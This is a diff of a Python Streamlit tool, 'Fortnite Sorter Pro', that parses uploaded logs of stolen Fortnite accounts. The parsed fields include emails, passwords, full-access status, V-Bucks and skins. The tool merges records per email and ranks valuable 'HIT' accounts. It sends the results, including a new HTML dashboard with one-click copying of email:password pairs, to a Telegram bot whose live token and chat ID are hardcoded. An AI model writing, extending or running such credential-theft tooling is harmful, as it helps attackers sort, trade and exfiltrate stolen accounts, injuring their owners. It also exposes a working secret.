@@ -13,7 +13,7 @@ import shutil
 import streamlit.components.v1 as components
 
 # --- Configuration ---
-SCRIPT_VERSION = "7.1"  # Increment to force cache reset
+SCRIPT_VERSION = "8.0"  # Increment to force cache reset
 DEFAULT_TG_TOKEN = "8320526788:AAECI8pPkEqUOEV3JaAz8VEVoLDKfnY2BCY"
 DEFAULT_CHAT_ID = "-1003446261251"
 
@@ -51,7 +51,9 @@ def send_telegram_document(token, chat_id, file_buffer, filename, caption=""):
     url = f"https://api.telegram.org/bot{token}/sendDocument"
     data = {"chat_id": chat_id, "caption": caption}
     file_buffer.seek(0)
-    files = {"document": (filename, file_buffer, "text/plain")}
+    # Correct MIME type for HTML
+    mime = "text/html" if filename.endswith(".html") else "text/plain"
+    files = {"document": (filename, file_buffer, mime)}
     try:
         response = requests.post(url, data=data, files=files, timeout=30)
         return response.json()
@@ -103,26 +105,23 @@ class FortniteAccountParser:
         stw_match = re.search(r'STW:\s*(Yes|No|True|False|1|0)', remaining, re.IGNORECASE)
         account['stw'] = normalize_bool(stw_match.group(1)) if stw_match else 'No'
         
-        # V-Bucks (Modified slightly to allow commas "1,050" which old script might miss)
+        # V-Bucks
         vbucks_match = re.search(r'(Vbucks Count|V-Bucks|Vbucks):\s*([\d,]+)', remaining, re.IGNORECASE)
         account['vbucks'] = int(vbucks_match.group(2).replace(',', '')) if vbucks_match else 0
         
-        # Skins Count (Note: No re.IGNORECASE in old script for this)
+        # Skins Count
         skins_count_match = re.search(r'Skins:\s*\[(\d+)\]', remaining)
         account['skins'] = int(skins_count_match.group(1)) if skins_count_match else 0
         
-        # Skin Names (Note: No re.IGNORECASE in old script for this)
-        # It looks for: Skins: [123]: Skin1, Skin2
+        # Skin Names
         skins_names_match = re.search(r'Skins:\s*\[\d*\]:\s*(.+?)(?=\s*\||$)', remaining)
         account['skin_names'] = [name.strip() for name in skins_names_match.group(1).split(',')] if skins_names_match else []
 
-        # Fallback for Skin Names if strict format fails (Safety Net)
+        # Fallback for Skin Names
         if not account['skin_names'] and account['skins'] > 0:
-             # Try grabbing text after "Skins:" even if brackets are missing
              fallback_match = re.search(r'Skins:\s*(?![\[])(.+?)(?=\s*\||$)', remaining)
              if fallback_match:
                  potential = fallback_match.group(1).split(',')
-                 # Basic filter to avoid grabbing numbers
                  account['skin_names'] = [n.strip() for n in potential if not n.strip().isdigit()]
 
         # Last Played
@@ -133,9 +132,8 @@ class FortniteAccountParser:
         username_match = re.search(r'Username:\s*([^|]+)', remaining)
         account['username'] = username_match.group(1).strip() if username_match else 'Unknown'
         
-        # Matches Played (Old Script Pattern)
+        # Matches Played
         matches_match = re.search(r'Matches Played:\s*(\d+)', remaining, re.IGNORECASE)
-        # Fallback if "Played" is missing in newer logs
         if not matches_match:
             matches_match = re.search(r'Matches:\s*(\d+)', remaining, re.IGNORECASE)
         account['matches_played'] = int(matches_match.group(1)) if matches_match else 0
@@ -158,69 +156,50 @@ class FortniteAccountParser:
         return account
 
     def merge_account(self, existing, new):
-        """
-        SMART MERGE: Logic from old script.
-        Combines data from multiple files for the same email.
-        """
         for key, value in new.items():
-            # Numeric fields: Keep the higher value
             if key in ('vbucks', 'skins', 'matches_played', 'points', 'level'):
                 if value > existing.get(key, 0):
                     existing[key] = value
-            
-            # Lists (Skins): Keep the longer list
             elif key == 'skin_names':
                 if len(value) > len(existing.get(key, [])):
                     existing[key] = value
-            
-            # Strings: Update if "Unknown" or if new value is present
             elif key in ('last_played', 'username', 'platform'):
                 if value != 'Unknown':
-                    # If existing is unknown, take new. If both exist, take new (assuming fresher scan).
                     existing[key] = value
-            
-            # Booleans: If 'Yes' is found, keep it (Upgrade 'No' to 'Yes')
             elif key in ('fa', 'twofa', 'stw'):
                 if existing.get(key, 'No') == 'No' and value == 'Yes':
                     existing[key] = value
-                    
-        # Re-evaluate HIT status after merge
         existing['is_hit'] = (existing.get('fa') == 'Yes' and existing.get('stw') == 'Yes')
 
     def process_directory(self, root_dir):
-        # Recursive walk (Better than old script's flat listdir)
         for root, _, files in os.walk(root_dir):
             for file in files:
                 if file.endswith('.txt'):
                     try:
-                        # errors='ignore' matches old script behavior to skip bad chars
                         with open(os.path.join(root, file), 'r', encoding='utf-8', errors='ignore') as f:
                             for line in f:
                                 p = self.parse_line(line)
                                 if p:
                                     email = p['email']
                                     if email in self.accounts:
-                                        # MERGE existing data
                                         self.merge_account(self.accounts[email], p)
                                     else:
                                         self.accounts[email] = p
                     except Exception:
                         pass
         
-        # Calculate Final Stats
         vals = self.accounts.values()
         self.stats['total_accounts'] = len(vals)
         self.stats['total_vbucks'] = sum(a.get('vbucks', 0) for a in vals)
         self.stats['hit_accounts'] = sum(1 for a in vals if a.get('is_hit'))
         self.stats['fa_yes'] = sum(1 for a in vals if a.get('fa') == 'Yes')
-        self.stats['stw_yes'] = sum(1 for a in vals if a.get('stw') == 'Yes')  # Added STW Count
+        self.stats['stw_yes'] = sum(1 for a in vals if a.get('stw') == 'Yes')
         self.stats['total_skins'] = sum(a.get('skins', 0) for a in vals)
         
         return len(vals)
 
     def get_txt_string(self):
         output = io.StringIO()
-        # Sort by Vbucks High -> Low
         sorted_accs = sorted(self.accounts.values(), key=lambda x: x.get('vbucks', 0), reverse=True)
         
         output.write(f"Generated by Fortnite Sorter Pro - {datetime.now().strftime('%Y-%m-%d %H:%M')}\n")
@@ -230,7 +209,6 @@ class FortniteAccountParser:
             skin_sec = f"Skins: [{acc['skins']}]"
             if acc['skin_names']:
                 skin_str = ", ".join(acc['skin_names'])
-                # Reconstruct format: Skins: [Count]: Name1, Name2
                 skin_sec = f"Skins: [{acc['skins']}]: {skin_str}"
 
             line = (
@@ -248,19 +226,28 @@ class FortniteAccountParser:
             
         return output.getvalue()
 
-# --- UI Render ---
-def render_html_view(accounts_json):
+# --- HTML Generator ---
+def generate_standalone_html(accounts_list):
+    # This generates a full HTML file with embedded data
+    # that can be opened anywhere without a server
+    json_data = json.dumps(accounts_list)
+    
     html = f"""
     <!DOCTYPE html>
     <html>
     <head>
+    <title>Fortnite Sorter Results</title>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap');
         :root {{ --bg: #0e1117; --card: #1a1c24; --border: #2d2f36; --accent: #FF4B4B; --text: #e0e0e0; --green: #22c55e; --red: #ef4444; --blue: #3b82f6; }}
-        body {{ background: transparent; color: var(--text); font-family: 'Inter', sans-serif; margin: 0; font-size: 14px; }}
+        body {{ background: var(--bg); color: var(--text); font-family: 'Inter', sans-serif; margin: 0; padding: 20px; font-size: 14px; }}
         
-        .controls {{ display: flex; gap: 8px; margin-bottom: 15px; flex-wrap: wrap; }}
+        .header-title {{ text-align: center; margin-bottom: 20px; color: white; }}
+        
+        .controls {{ display: flex; gap: 8px; margin-bottom: 15px; flex-wrap: wrap; justify-content: center; }}
         .btn {{ background: var(--card); border: 1px solid var(--border); color: var(--text); padding: 8px 16px; border-radius: 6px; cursor: pointer; font-weight: 600; transition: 0.2s; display: flex; align-items: center; gap: 6px; }}
         .btn:hover, .btn.active {{ border-color: var(--accent); color: var(--accent); background: rgba(255, 75, 75, 0.1); }}
         
@@ -273,15 +260,13 @@ def render_html_view(accounts_json):
         .email {{ background: #0003; padding: 5px 10px; border-radius: 4px; font-family: monospace; cursor: pointer; border: 1px solid #ffffff05; max-width: 220px; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }}
         .email:active {{ color: var(--accent); border-color: var(--accent); }}
         
-        /* Stats Row */
         .stats {{ display: flex; background: #ffffff05; border-radius: 5px; padding: 8px; }}
         .stat {{ flex: 1; text-align: center; border-right: 1px solid #ffffff05; }}
         .stat:last-child {{ border-right: none; }}
         .stat-val {{ font-weight: 700; }}
         .stat-lbl {{ font-size: 0.7em; color: #888; text-transform: uppercase; }}
         
-        .yes {{ color: var(--green); }} 
-        .no {{ color: var(--red); }}
+        .yes {{ color: var(--green); }} .no {{ color: var(--red); }}
         
         .skins {{ font-size: 0.85em; color: #aaa; background: #0003; padding: 8px; border-radius: 4px; max-height: 80px; overflow-y: auto; line-height: 1.4; }}
         .skins::-webkit-scrollbar {{ width: 4px; }}
@@ -291,17 +276,18 @@ def render_html_view(accounts_json):
     </style>
     </head>
     <body>
+        <h2 class="header-title">⚡ Fortnite Sorter Results</h2>
         <div class="controls">
             <button class="btn active" onclick="filter('all', this)">All Accounts</button>
             <button class="btn" onclick="filter('hit', this)">🔥 HITs</button>
             <button class="btn" onclick="filter('fa', this)">🔓 FA</button>
             <button class="btn" onclick="filter('stw', this)">⚡ STW</button>
             <button class="btn" onclick="filter('1k', this)">💰 1k+ VBucks</button>
-            <div style="flex-grow:1; text-align:right; color:#777; align-self:center;" id="count">Loading...</div>
+            <div style="margin-left: 10px; color:#777; align-self:center;" id="count">Loading...</div>
         </div>
         <div class="grid" id="grid"></div>
         <script>
-            let data = {accounts_json};
+            let data = {json_data};
             data.sort((a, b) => b.vbucks - a.vbucks);
             const grid = document.getElementById('grid');
             const count = document.getElementById('count');
@@ -318,7 +304,7 @@ def render_html_view(accounts_json):
                     card.innerHTML = `
                         <div class="header">
                             <div class="vbucks"><i class="fas fa-coins"></i> ${{acc.vbucks.toLocaleString()}}</div>
-                            <div class="email" onclick="navigator.clipboard.writeText('${{acc.email}}:${{acc.password}}')">${{acc.email}}</div>
+                            <div class="email" onclick="navigator.clipboard.writeText('${{acc.email}}:${{acc.password}}'); alert('Copied!')">${{acc.email}}</div>
                         </div>
                         <div class="stats">
                             <div class="stat"><div class="stat-val ${{acc.fa=='Yes'?'yes':'no'}}">${{acc.fa}}</div><div class="stat-lbl">FA</div></div>
@@ -359,7 +345,7 @@ def main():
             st.session_state.clear()
             st.rerun()
 
-    st.title("⚡ Fortnite Sorter Pro v7.1")
+    st.title("⚡ Fortnite Sorter Pro v8.0")
     
     if st.session_state.processed_accounts is None:
         uploaded_file = st.file_uploader("📂 Upload ZIP file", type="zip")
@@ -383,38 +369,49 @@ def main():
         accounts = st.session_state.processed_accounts
         stats = st.session_state.stats
         
-        c1, c2, c3 = st.columns([1, 1, 1])
+        # Prepare Data
         parser = FortniteAccountParser()
         parser.accounts = accounts
         txt_data = parser.get_txt_string()
+        html_data = generate_standalone_html(list(accounts.values()))
+        
+        # Columns for actions
+        c1, c2, c3 = st.columns(3)
         
         with c1:
-            st.download_button("💾 Download Results (TXT)", data=txt_data, file_name=f"Fortnite_Results.txt", mime="text/plain", use_container_width=True)
+            st.download_button("💾 Download TXT", data=txt_data, file_name="Results.txt", mime="text/plain", use_container_width=True)
+            
         with c2:
-            if st.button("✈️ Send to Telegram", use_container_width=True):
-                with st.spinner("Sending..."):
-                    if tg_token and tg_chat_id:
-                        msg = f"📊 *Results*\n👤 Accounts: `{stats['total_accounts']}`\n🔥 HITs: `{stats['hit_accounts']}`\n💰 V-Bucks: `{stats['total_vbucks']:,}`\n👕 Total Skins: `{stats['total_skins']}`"
-                        send_telegram_message(tg_token, tg_chat_id, msg)
-                        buf = io.BytesIO(txt_data.encode('utf-8'))
-                        send_telegram_document(tg_token, tg_chat_id, buf, "Results.txt")
-                        st.success("Sent!")
-                    else: st.error("Check keys")
+            if st.button("✈️ Send TXT File", use_container_width=True):
+                if tg_token and tg_chat_id:
+                    msg = f"📊 *Results*\n👤 Accounts: `{stats['total_accounts']}`\n💰 V-Bucks: `{stats['total_vbucks']:,}`"
+                    send_telegram_message(tg_token, tg_chat_id, msg)
+                    buf = io.BytesIO(txt_data.encode('utf-8'))
+                    send_telegram_document(tg_token, tg_chat_id, buf, "Results.txt")
+                    st.success("Sent TXT!")
+                else: st.error("Check keys")
+        
         with c3:
-            if st.button("🔙 New Upload", use_container_width=True):
-                st.session_state.clear()
-                st.rerun()
+            # NEW: Send HTML View
+            if st.button("🌐 Send Web View", use_container_width=True):
+                if tg_token and tg_chat_id:
+                    with st.spinner("Generating Web View..."):
+                        buf = io.BytesIO(html_data.encode('utf-8'))
+                        # Send as .html file
+                        send_telegram_document(tg_token, tg_chat_id, buf, "Dashboard.html")
+                        st.success("Sent Dashboard!")
+                else: st.error("Check keys")
 
-        # UPDATED: 5 Columns for Metrics to include STW
+        # Stats
         m1, m2, m3, m4, m5 = st.columns(5)
         m1.metric("Total Accounts", stats['total_accounts'])
         m2.metric("Total V-Bucks", f"{stats['total_vbucks']:,}")
         m3.metric("HITs (FA+STW)", stats['hit_accounts'])
-        m4.metric("STW Accounts", stats['stw_yes'])  # New Metric
+        m4.metric("STW Accounts", stats['stw_yes'])
         m5.metric("Total Skins", stats['total_skins'])
         
         st.divider()
-        components.html(render_html_view(json.dumps(list(accounts.values()))), height=1000, scrolling=True)
+        components.html(html_data, height=1000, scrolling=True)
 
 if __name__ == "__main__":
     main()
